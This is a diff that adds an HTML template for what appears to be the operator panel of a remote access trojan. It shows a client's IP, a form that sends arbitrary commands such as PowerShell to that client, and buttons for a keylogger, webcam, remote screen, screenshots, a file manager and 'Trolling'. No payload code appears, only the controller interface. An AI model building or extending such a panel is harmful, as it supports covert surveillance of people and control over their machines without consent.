@@ -1,0 +1,74 @@
+<div class="bg-gray-800 p-6 rounded-lg shadow-xl mt-8">
+    <h2 class="text-2xl mb-4 font-semibold">
+        Controlling client:
+        <span class="text-blue-400 font-mono">{{ ip }}</span>
+    </h2>
+
+    <form
+        hx-post="/run_command/{{ ip }}"
+        hx-target="#command-output-{{ ip }}"
+        hx-swap="innerHTML"
+        class="space-y-4 mb-6"
+    >
+        <input
+            type="text"
+            name="command"
+            placeholder="powershell -Command Get-Process"
+            class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
+        />
+
+        <button
+            type="submit"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded transition"
+        >
+            Run command
+        </button>
+    </form>
+
+    <div class="grid grid-cols-2 sm:grid-cols-3 gap-4">
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            File Manager
+        </button>
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Screenshot
+        </button>
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Chat
+        </button>
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Keylogger
+        </button>
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Remote screen
+        </button>
+
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Task Manager
+        </button>
+
+        <button
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+        >
+            Webcam
+        </button>
+        <button class="bg-red-600 hover:bg-red-700 p-3 rounded transition">
+            Trolling
+        </button>
+    </div>
+
+    <div id="command-output-{{ ip }}" class="mt-4 text-sm">
+        <p class="text-gray-500">Command result will appear here</p>
+    </div>
+</div>
